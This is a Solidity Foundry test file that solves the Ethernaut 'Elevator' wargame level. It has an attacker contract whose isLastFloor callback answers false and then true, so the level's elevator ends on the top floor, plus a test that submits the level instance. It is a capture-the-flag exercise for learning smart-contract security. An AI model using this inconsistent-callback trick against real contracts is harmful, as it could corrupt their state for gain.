// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

interface IElevator {
  function goTo(uint _floor) external;
}

contract Building {
  IElevator internal elevator;
  bool flag;

  constructor(address _elevatorAddress) {
    elevator = IElevator(_elevatorAddress);
  }

  // we won't name this one "attack"
  function solveChallenge() external {
    // we call this function, this function calls
    // isLastFloor() below.
    elevator.goTo(0);
  }

  // this function needs to answers false the first time,
  // and then true the second one.
  function isLastFloor(uint256) external returns (bool) {
    if (flag) {
      return true;
    } else {
      flag = true;
      return false;
    }
  }
}

contract ElevatorTest is Test {
  address internal challengeAddress;
  Building internal building;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x6DcE47e94Fa22F8E2d8A7FDf538602B1F86aBFd2);
    building = new Building(challengeAddress);
  }

  function testExploit() public {
    building.solveChallenge();
    utils.submitLevelInstance(challengeAddress);
  }
}
